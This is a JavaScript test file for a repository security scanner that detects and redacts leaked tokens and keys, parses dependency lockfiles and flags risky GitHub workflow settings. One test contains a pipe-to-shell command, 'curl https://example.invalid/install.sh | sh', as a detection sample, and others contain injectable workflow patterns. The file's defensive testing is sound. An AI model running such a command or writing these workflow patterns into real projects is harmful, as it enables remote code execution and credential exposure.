const test = require("node:test");
const assert = require("node:assert/strict");
const { scanText, parseDeps, redactEvidence, sourceUrl } = require("../scanner-core.js");

test("placeholder password examples are not reported", () => {
  const findings = scanText(
    "export ANDROID_KEYSTORE_PASSWORD='your-keystore-password'\nexport ANDROID_KEY_PASSWORD='your-key-password'",
    "docs/BUILD_NOTES.md", "owner", "repo", "main", []
  );
  assert.equal(findings.length, 0);
});

test("GitHub tokens are detected and redacted", () => {
  const token = "ghp_" + "A".repeat(36);
  const findings = scanText('const token = "' + token + '";', "src/config.js", "owner", "repo", "main", []);
  assert.equal(findings.length, 1);
  assert.equal(findings[0].title, "Possible GitHub credential");
  assert.ok(findings[0].evidence.includes("[REDACTED]"));
  assert.ok(!findings[0].evidence.includes(token));
});

test("generic hard-coded credential values are redacted", () => {
  const findings = scanText('const api_key = "live-secret-value-12345";', "src/config.js", "owner", "repo", "main", []);
  assert.equal(findings.length, 1);
  assert.ok(!findings[0].evidence.includes("live-secret-value-12345"));
  assert.ok(findings[0].evidence.includes("[REDACTED]"));
});

test("redaction happens before evidence is truncated", () => {
  const evidence = redactEvidence("x".repeat(175) + " ghp_" + "Q".repeat(36));
  assert.ok(!evidence.includes("ghp_"));
  assert.ok(!evidence.includes("QQQQ"));
});

test("nested npm lockfile dependencies use their full package names", () => {
  const lock = JSON.stringify({lockfileVersion:3,packages:{
    "node_modules/lodash":{version:"4.17.20"},
    "node_modules/parent/node_modules/lodash":{version:"4.17.21"},
    "node_modules/@scope/pkg":{version:"1.2.3"}
  }});
  const found = parseDeps("package-lock.json", lock).map(d => [d.name,d.version,d.ecosystem]);
  assert.ok(found.some(d => d[0] === "lodash" && d[1] === "4.17.20" && d[2] === "npm"));
  assert.ok(found.some(d => d[0] === "lodash" && d[1] === "4.17.21" && d[2] === "npm"));
  assert.ok(found.some(d => d[0] === "@scope/pkg" && d[1] === "1.2.3" && d[2] === "npm"));
});

test("Python requirements only include exact pinned versions", () => {
  assert.deepEqual(parseDeps("requirements.txt", "requests==2.31.0\nflask>=2.0\n"), [
    {name:"requests",version:"2.31.0",ecosystem:"PyPI"}
  ]);
});

test("dangerous remote shell patterns are findings outside documentation", () => {
  const findings = scanText("curl https://example.invalid/install.sh | sh", "install.sh", "owner", "repo", "main", []);
  assert.ok(findings.some(f => f.category === "Suspicious code" && f.severity === "high"));
  const docs = scanText("curl https://example.invalid/install.sh | sh", "docs/INSTALL.md", "owner", "repo", "main", []);
  assert.equal(docs.length, 0);
});

test("risky GitHub workflow patterns include a source link", () => {
  const findings = scanText("permissions: write-all\nuses: actions/checkout@main", ".github/workflows/ci.yml", "owner", "repo", "feature/security", []);
  assert.ok(findings.some(f => f.title === "Broad workflow permissions" && f.severity === "high"));
  const moving = findings.find(f => f.title === "Action uses a moving branch reference");
  assert.ok(moving);
  assert.equal(moving.source_url, "https://github.com/owner/repo/blob/feature/security/.github/workflows/ci.yml#L2");
});

test("source paths are encoded segment by segment", () => {
  assert.equal(sourceUrl("owner","repo","main","src/a b.js",4), "https://github.com/owner/repo/blob/main/src/a%20b.js#L4");
});


test("PEM private key headers are reported as critical", () => {
  const findings = scanText("-----BEGIN ENCRYPTED PRIVATE KEY-----", "keys/release.pem", "owner", "repo", "main", []);
  assert.equal(findings.length, 1);
  assert.equal(findings[0].title, "Private key material");
  assert.equal(findings[0].severity, "critical");
});

test("GitLab and npm tokens are detected and redacted", () => {
  const gitlab = "glpat-" + "G".repeat(30);
  const npm = "npm_" + "N".repeat(36);
  const gitlabFindings = scanText('const token = "' + gitlab + '";', "src/config.js", "owner", "repo", "main", []);
  const npmFindings = scanText('const token = "' + npm + '";', "src/config.js", "owner", "repo", "main", []);
  assert.equal(gitlabFindings[0].title, "Possible GitLab credential");
  assert.ok(!gitlabFindings[0].evidence.includes(gitlab));
  assert.equal(npmFindings[0].title, "Possible npm token");
  assert.ok(!npmFindings[0].evidence.includes(npm));
});

test("prefixed secret-key assignments such as STRIPE_SECRET_KEY are detected", () => {
  const findings = scanText('const STRIPE_SECRET_KEY = "actual-secret-value-84721";', "src/config.js", "owner", "repo", "main", []);
  assert.equal(findings.length, 1);
  assert.equal(findings[0].title, "Possible hard-coded credential");
  assert.ok(!findings[0].evidence.includes("actual-secret-value-84721"));
});


test("legacy npm package-lock files are parsed recursively", () => {
  const lock = JSON.stringify({lockfileVersion:1,dependencies:{
    "left-pad":{version:"1.3.0",dependencies:{
      "repeat-string":{version:"1.6.1"}
    }}
  }});
  const found = parseDeps("package-lock.json",lock).map(d => [d.name,d.version,d.ecosystem]);
  assert.ok(found.some(d => d[0] === "left-pad" && d[1] === "1.3.0" && d[2] === "npm"));
  assert.ok(found.some(d => d[0] === "repeat-string" && d[1] === "1.6.1" && d[2] === "npm"));
});


test("privileged pull_request_target workflows are flagged", () => {
  const findings = scanText("pull_request_target:\\n  types: [opened]", ".github/workflows/ci.yml", "owner", "repo", "main", []);
  assert.ok(findings.some(f => f.title === "Privileged pull_request_target trigger" && f.severity === "high"));
});

test("untrusted pull request data interpolated into shell is flagged", () => {
  const findings = scanText('run: echo "' + "${{ github.event.pull_request.title }}" + '"' , ".github/workflows/ci.yml", "owner", "repo", "main", []);
  assert.ok(findings.some(f => f.title === "Untrusted event data interpolated into shell" && f.severity === "high"));
});

test("mutable version tags and credential persistence are flagged", () => {
  const findings = scanText("uses: actions/checkout@v4\\npersist-credentials: true", ".github/workflows/ci.yml", "owner", "repo", "main", []);
  assert.ok(findings.some(f => f.title === "Action uses a mutable reference"));
  assert.ok(findings.some(f => f.title === "Checkout persists repository credentials"));
});

test("workflow references pinned to a full commit SHA are not flagged as mutable", () => {
  const findings = scanText("uses: actions/checkout@3df4ab11eba7bda6032a0b4b55b2e1e8b9f9a2b4", ".github/workflows/ci.yml", "owner", "repo", "main", []);
  assert.equal(findings.filter(f => f.title === "Action uses a mutable reference").length, 0);
});
